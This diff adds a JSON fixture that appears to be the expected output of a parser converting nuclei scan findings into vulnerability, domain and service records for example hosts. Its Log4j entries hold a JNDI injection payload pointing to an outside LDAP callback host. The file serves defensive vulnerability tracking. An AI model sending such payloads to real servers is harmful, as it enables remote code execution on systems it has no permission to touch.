@@ -1,0 +1,865 @@
+{
+  "tool": "nuclei",
+  "format_version": "1",
+  "input": "input.jsonl",
+  "bad_lines": [
+    {
+      "line": 7,
+      "reason": "缺 matched-at（或它不是字符串）：None —— 命中目标是漏洞身份的另一半，缺了它这条记录无法落库"
+    }
+  ],
+  "unknown_fields": {},
+  "records": [
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "CVE-2021-44228@https://app.example.com:443/",
+      "display": "Apache Log4j2 Remote Code Execution",
+      "subtitle": "critical · https://app.example.com:443/",
+      "attrs": {
+        "template_id": "CVE-2021-44228",
+        "severity": "critical",
+        "state": "open",
+        "target": "https://app.example.com:443/"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "severity",
+      "value": "critical"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "template_id",
+      "value": "CVE-2021-44228"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "matched_at",
+      "value": "https://app.example.com:443/"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "vuln_type",
+      "value": "http"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "template_name",
+      "value": "Apache Log4j2 Remote Code Execution"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "matcher_name",
+      "value": "jndi-in-params"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "ip",
+      "value": "203.0.113.10"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "extracted_results",
+      "value": "${jndi:ldap://x.oast.pro/a}"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "tags",
+      "value": "cve, cve2021, rce, log4j"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "reference",
+      "value": "https://logging.apache.org/log4j/2.x/security.html"
+    },
+    {
+      "type": "entity",
+      "kind": "domain",
+      "key": "app.example.com",
+      "display": "app.example.com"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "app.example.com:443",
+      "display": "app.example.com:443",
+      "subtitle": "https://app.example.com:443/"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "dst": [
+        "service",
+        "app.example.com:443"
+      ],
+      "rel": "found_on"
+    },
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "exposed-git-config@https://app.example.com:443/.git/config",
+      "display": "Exposed Git Config",
+      "subtitle": "high · https://app.example.com:443/.git/config",
+      "attrs": {
+        "template_id": "exposed-git-config",
+        "severity": "high",
+        "state": "open",
+        "target": "https://app.example.com:443/.git/config"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "severity",
+      "value": "high"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "template_id",
+      "value": "exposed-git-config"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "matched_at",
+      "value": "https://app.example.com:443/.git/config"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "vuln_type",
+      "value": "http"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "template_name",
+      "value": "Exposed Git Config"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "matcher_name",
+      "value": "status-200"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "ip",
+      "value": "203.0.113.10"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "tags",
+      "value": "exposure, git, config"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "field": "reference",
+      "value": "https://example.com/git-config"
+    },
+    {
+      "type": "entity",
+      "kind": "domain",
+      "key": "app.example.com",
+      "display": "app.example.com"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "app.example.com:443",
+      "display": "app.example.com:443",
+      "subtitle": "https://app.example.com:443/.git/config"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "exposed-git-config@https://app.example.com:443/.git/config"
+      ],
+      "dst": [
+        "service",
+        "app.example.com:443"
+      ],
+      "rel": "found_on"
+    },
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "http-missing-security-headers@https://api.example.com:443/",
+      "display": "HTTP Missing Security Headers",
+      "subtitle": "medium · https://api.example.com:443/",
+      "attrs": {
+        "template_id": "http-missing-security-headers",
+        "severity": "medium",
+        "state": "open",
+        "target": "https://api.example.com:443/"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "severity",
+      "value": "medium"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "template_id",
+      "value": "http-missing-security-headers"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "matched_at",
+      "value": "https://api.example.com:443/"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "vuln_type",
+      "value": "http"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "template_name",
+      "value": "HTTP Missing Security Headers"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "ip",
+      "value": "203.0.113.11"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "field": "tags",
+      "value": "misconfig, headers"
+    },
+    {
+      "type": "entity",
+      "kind": "domain",
+      "key": "api.example.com",
+      "display": "api.example.com"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "api.example.com:443",
+      "display": "api.example.com:443",
+      "subtitle": "https://api.example.com:443/"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "http-missing-security-headers@https://api.example.com:443/"
+      ],
+      "dst": [
+        "service",
+        "api.example.com:443"
+      ],
+      "rel": "found_on"
+    },
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "weak-cipher-suites@api.example.com:8443",
+      "display": "Weak Cipher Suites Detected",
+      "subtitle": "low · api.example.com:8443",
+      "attrs": {
+        "template_id": "weak-cipher-suites",
+        "severity": "low",
+        "state": "open",
+        "target": "api.example.com:8443"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "severity",
+      "value": "low"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "template_id",
+      "value": "weak-cipher-suites"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "matched_at",
+      "value": "api.example.com:8443"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "vuln_type",
+      "value": "ssl"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "template_name",
+      "value": "Weak Cipher Suites Detected"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "ip",
+      "value": "203.0.113.11"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "field": "tags",
+      "value": "ssl, tls"
+    },
+    {
+      "type": "entity",
+      "kind": "domain",
+      "key": "api.example.com",
+      "display": "api.example.com"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "api.example.com:8443",
+      "display": "api.example.com:8443",
+      "subtitle": "api.example.com:8443"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "weak-cipher-suites@api.example.com:8443"
+      ],
+      "dst": [
+        "service",
+        "api.example.com:8443"
+      ],
+      "rel": "found_on"
+    },
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "tech-detect@https://nginx.example.com:443/",
+      "display": "Technology Detection",
+      "subtitle": "info · https://nginx.example.com:443/",
+      "attrs": {
+        "template_id": "tech-detect",
+        "severity": "info",
+        "state": "open",
+        "target": "https://nginx.example.com:443/"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "severity",
+      "value": "info"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "template_id",
+      "value": "tech-detect"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "matched_at",
+      "value": "https://nginx.example.com:443/"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "vuln_type",
+      "value": "http"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "template_name",
+      "value": "Technology Detection"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "matcher_name",
+      "value": "nginx"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "ip",
+      "value": "203.0.113.12"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "field": "tags",
+      "value": "tech"
+    },
+    {
+      "type": "entity",
+      "kind": "domain",
+      "key": "nginx.example.com",
+      "display": "nginx.example.com"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "nginx.example.com:443",
+      "display": "nginx.example.com:443",
+      "subtitle": "https://nginx.example.com:443/"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "tech-detect@https://nginx.example.com:443/"
+      ],
+      "dst": [
+        "service",
+        "nginx.example.com:443"
+      ],
+      "rel": "found_on"
+    },
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "CVE-2021-44228@https://app.example.com:443/",
+      "display": "Apache Log4j2 Remote Code Execution",
+      "subtitle": "critical · https://app.example.com:443/",
+      "attrs": {
+        "template_id": "CVE-2021-44228",
+        "severity": "critical",
+        "state": "open",
+        "target": "https://app.example.com:443/"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "severity",
+      "value": "critical"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "template_id",
+      "value": "CVE-2021-44228"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "matched_at",
+      "value": "https://app.example.com:443/"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "vuln_type",
+      "value": "http"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "template_name",
+      "value": "Apache Log4j2 Remote Code Execution"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "matcher_name",
+      "value": "jndi-in-params"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "ip",
+      "value": "203.0.113.10"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "extracted_results",
+      "value": "${jndi:ldap://x.oast.pro/a}"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "tags",
+      "value": "cve, cve2021, rce, log4j"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "field": "reference",
+      "value": "https://logging.apache.org/log4j/2.x/security.html"
+    },
+    {
+      "type": "entity",
+      "kind": "domain",
+      "key": "app.example.com",
+      "display": "app.example.com"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "app.example.com:443",
+      "display": "app.example.com:443",
+      "subtitle": "https://app.example.com:443/"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "CVE-2021-44228@https://app.example.com:443/"
+      ],
+      "dst": [
+        "service",
+        "app.example.com:443"
+      ],
+      "rel": "found_on"
+    },
+    {
+      "type": "entity",
+      "kind": "vuln",
+      "key": "CVE-2019-0708@203.0.113.20:3389",
+      "display": "Microsoft Remote Desktop Services Remote Code Execution",
+      "subtitle": "critical · 203.0.113.20:3389",
+      "attrs": {
+        "template_id": "CVE-2019-0708",
+        "severity": "critical",
+        "state": "open",
+        "target": "203.0.113.20:3389"
+      }
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "severity",
+      "value": "critical"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "state",
+      "value": "open"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "template_id",
+      "value": "CVE-2019-0708"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "matched_at",
+      "value": "203.0.113.20:3389"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "vuln_type",
+      "value": "network"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "template_name",
+      "value": "Microsoft Remote Desktop Services Remote Code Execution"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "ip",
+      "value": "203.0.113.20"
+    },
+    {
+      "type": "observation",
+      "entity_ref": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "field": "tags",
+      "value": "cve, cve2019, rce, rdp"
+    },
+    {
+      "type": "entity",
+      "kind": "ip",
+      "key": "203.0.113.20",
+      "display": "203.0.113.20"
+    },
+    {
+      "type": "entity",
+      "kind": "service",
+      "key": "203.0.113.20:3389",
+      "display": "203.0.113.20:3389",
+      "subtitle": "203.0.113.20:3389"
+    },
+    {
+      "type": "relation",
+      "src": [
+        "vuln",
+        "CVE-2019-0708@203.0.113.20:3389"
+      ],
+      "dst": [
+        "service",
+        "203.0.113.20:3389"
+      ],
+      "rel": "found_on"
+    }
+  ]
+}
